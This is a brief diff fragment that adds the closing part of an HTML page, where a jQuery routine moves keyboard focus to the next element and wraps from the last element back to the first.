+                els.each(function(i) {
+                    if (this === this_) {
+                        if (els.length - 1 == i) {
+                            els.eq(0).focus();
+                        } else {
+                            els.eq(i + 1).focus();
+                        }
+                    }
+                });
+            }
+        });
+    };
+    </script>
+</body>
+
+</html>
